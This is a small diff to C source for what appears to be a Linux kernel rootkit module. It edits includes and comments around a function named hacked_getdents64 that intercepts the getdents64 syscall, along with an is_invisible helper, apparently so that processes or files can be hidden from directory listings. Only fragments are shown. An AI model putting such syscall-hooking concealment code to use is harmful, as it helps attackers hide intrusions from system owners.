@@ -7,11 +7,7 @@
 #include <asm/ptrace.h>		/* For intercepting syscall, struct named pt_regs is needed */
 
 
-#ifndef __NR_getdents
-#define __NR_getdents 141
-#endif
-
-// =============================================================================
+// ============================================================================
 
 #include <linux/dirent.h>	/* struct dirent refers to directory entry. */
 
@@ -140,6 +136,7 @@ static int is_invisible(pid_t pid)
 
 static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
 {
+	// Storing file descriptor
 	int fd = (int) pt_regs->di;
 
 	// Storing the name of the directory passed from user space via "si" register
